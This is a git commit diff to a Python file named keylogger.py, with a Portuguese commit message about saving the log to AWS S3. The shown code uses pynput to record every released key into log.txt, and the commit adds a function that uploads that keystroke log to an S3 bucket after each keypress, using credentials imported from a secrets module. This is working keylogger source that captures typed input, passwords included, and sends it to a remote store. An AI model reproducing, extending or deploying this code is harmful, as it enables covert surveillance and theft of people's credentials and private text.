a2a0047da99cd16dd36d1712a9575e3287f84987
Lucas <lufbasilio@hotmail.com>
2021-03-20 21:59:15 -0400

    Salvando log no AWS S3

--- keylogger.py
+++ keylogger.py
@@ -1,8 +1,27 @@
-from pynput.keyboard import Key, Listener 
+from pynput.keyboard import Key, Listener
+from secrets import access_key, secret_access_key
+import boto3
+import os
+import time
+
 
 def log(text):
 	with open("log.txt","a") as file_log:
 		file_log.write(text)
+
+
+def s3():
+    client = boto3.client('s3', 
+    aws_access_key_id = access_key, 
+    aws_secret_access_key = secret_access_key)
+
+    
+    for file in os.listdir():
+        if 'log.txt' in file:
+            upload_file_bucket = "logs-key"
+            upload_file_key = str(file)
+            client.upload_file(file, upload_file_bucket, upload_file_key)
+
 
 def press(key):
     key = str(key).replace("'", "")
@@ -17,7 +36,7 @@ def press(key):
         key = ''
 
     log(key)
-		
+    s3()
 
 
 with Listener(on_release=press) as listener:
